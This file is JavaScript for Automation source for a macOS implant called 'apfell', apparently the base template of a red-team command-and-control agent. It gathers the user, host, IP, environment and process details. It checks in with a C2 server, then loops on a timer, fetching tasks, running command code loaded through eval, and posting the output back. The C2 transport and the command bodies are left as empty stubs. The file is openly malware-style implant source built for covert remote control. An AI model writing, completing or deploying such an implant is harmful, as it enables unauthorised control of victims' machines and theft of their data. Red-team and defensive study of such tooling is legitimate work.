ObjC.import('Cocoa');
ObjC.import('Foundation'); //there by default I think, but safe to include anyway
ObjC.import('stdlib');
var currentApp = Application.currentApplication();
currentApp.includeStandardAdditions = true;
//--------------IMPLANT INFORMATION-----------------------------------
class implant{
	constructor(){
		this.procInfo = $.NSProcessInfo.processInfo;
		this.hostInfo = $.NSHost.currentHost;
		this.id = -1;
		this.user = ObjC.unwrap(this.procInfo.userName);
		this.fullName = ObjC.unwrap(this.procInfo.fullUserName);
		//every element in the array needs to be unwrapped
		this.ip = ObjC.unwrap(this.hostInfo.addresses); //probably just need [0]
		this.pid = this.procInfo.processIdentifier;
		//every element in the array needs to be unwrapped
		this.host = ObjC.unwrap(this.hostInfo.names); //probably just need [0]
		this.killdate = "";
		//this is a dictionary, but every 'value' needs to be unwrapped
		this.environment = ObjC.unwrap(this.procInfo.environment);
		this.uptime = this.procInfo.systemUptime;
		//every element in the array needs to be unwrapped
		this.args = ObjC.unwrap(this.procInfo.arguments);
		this.osVersion = this.procInfo.operatingSystemVersionString;
		this.uuid = "XXXX";
	}
}
apfell = new implant();
//--------------Base C2 INFORMATION----------------------------------------
class baseC2{
	//To create your own C2, extend this class and implement the required functions
	//The main code depends on the mechanism being C2 with these functions.
	//   the implementation of the functions doesn't matter though
	//   You're welcome to add additional functions as well, but this is the minimum
	constructor(interval, baseurl){
		this.interval = interval; //seconds between callbacks
		this.baseurl = baseurl; //where to reach out to
		this.commands = [];
	}
	getInterval(){
		return this.interval;
	}
	checkin(){
		//check in with c2 server
	}
	getTasking(){
		//reach out to wherever to get tasking
	}
	getConfig(){
		//gets the current configuration for tasking
	}
	postResponse(task, output){
		//output a response to a task
	}
	setConfig(params){
		//updates the current configuration for how to get tasking
	}
	download(task, params){
	    //gets a file from the apfell server in some way
	}
	upload(task, params){
	    //uploads a file in some way to the teamserver
	}
}
//------------- C2Profile -------------------------------------------
//-------------SHARED COMMAND CODE ------------------------
does_file_exist = function(strPath){
    var error = $();
    return $.NSFileManager.defaultManager.attributesOfItemAtPathError($(strPath).stringByStandardizingPath, error), error.code === undefined;
};
convert_to_nsdata = function(strData){
    // helper function to convert UTF8 strings to NSData objects
    var tmpString = $.NSString.alloc.initWithCStringEncoding(strData, $.NSData.NSUnicodeStringEncoding);
    return tmpString.dataUsingEncoding($.NSData.NSUTF16StringEncoding);
};
write_data_to_file = function(data, file_path){
    try{
        //var open_file = currentApp.openForAccess(Path(file_path), {writePermission: true});
        //currentApp.setEof(open_file, { to: 0 }); //clear the current file
        //currentApp.write(data, { to: open_file, startingAt: currentApp.getEof(open_file) });
        //currentApp.closeAccess(open_file);
        if (data.writeToFileAtomically($(file_path), true)){
            return "file written";
        }
        else{
            return "failed to write file";
        }
     }
     catch(error){
        return "failed to write to file: " + error.toString();
     }
};
default_load = function(contents){
    var module = {exports: {}};
    var exports = module.exports;
    if(typeof contents == "string"){
        eval(contents);
    }
    else{
        eval(contents.js);
    }
    return module.exports;
};
base64_decode = function(data){
    if(typeof data == "string"){
        var ns_data = $.NSData.alloc.initWithBase64Encoding($(data));
    }
    else{
        var ns_data = data;
    }
    var decoded_data = $.NSString.alloc.initWithDataEncoding(ns_data, $.NSUTF8StringEncoding).js;
    return decoded_data;
};
base64_encode = function(data){
    if(typeof data == "string"){
        var ns_data = convert_to_nsdata(data);
    }
    else{
        var ns_data = data;
    }
    var encoded = ns_data.base64EncodedStringWithOptions(0).js;
    return encoded;
};
    var commands_string = "" +
//-------------COMMAND DECLARATIONS AND IMPLEMENTATIONS -----------------------
"";
    var commands_dict = default_load(commands_string);
//-------------GET IP AND CHECKIN ----------------------------------
for(var i=0; i < apfell.ip.length; i++){
	ip = apfell.ip[i];
	if (ip.js.includes(".") && ip.js != "127.0.0.1"){ // the includes(".") is to make sure we're looking at IPv4
		//console.log("found ip, checking in");
		C2.setConfig({"commands": Object.keys(commands_dict)});
		C2.checkin(ip.js,apfell.pid,apfell.user,ObjC.unwrap(apfell.host[0]));
		break;
	}
}
//---------------------------MAIN LOOP ----------------------------------------
sleepWakeUp = function(t){
	var output = "";
	//console.log("checking for tasking");

	task = C2.getTasking();

	try{
		var command = ObjC.unwrap(task["command"]);
		if(command != "none"){
			var params = ObjC.unwrap(task["params"]);
			// params will either be a single parameter, string parameters, JSON of multiple params, or nothing
			//console.log(JSON.stringify(task));
			//console.log("processing task");
			try{
			    var output = commands_dict[command](task, command, params);

			}
			catch(error){
			    if(error.toString().includes("commands_dict[command] is not a function")){
			        output = "Unknown command: " + command;
			    }
			    else{
			        output = error.toString();
			    }
			}
//----------------------------- SWITCHING CALLS -------------------------------
			//else { output = "command not supported: " + command + " " + params; }
			if ((typeof output) == "string"){
			    output = convert_to_nsdata(output);
			}
			C2.postResponse(task, output);
		}
	}
	catch(error){
		C2.postResponse(task, error.toString());
	}
	task["command"] = "none"; //reset just in case something goes weird
};
//https://stackoverflow.com/questions/37834749/settimout-with-javascript-for-automation
timer = $.NSTimer.scheduledTimerWithTimeIntervalRepeatsBlock(C2.interval, true, sleepWakeUp);
$.NSRunLoop.currentRunLoop.addTimerForMode(timer, "timer");
//TODO update this to not be $.NSDate.distantFuture but rather should be the C2.killdate
$.NSRunLoop.currentRunLoop.runModeBeforeDate("timer", $.NSDate.distantFuture);
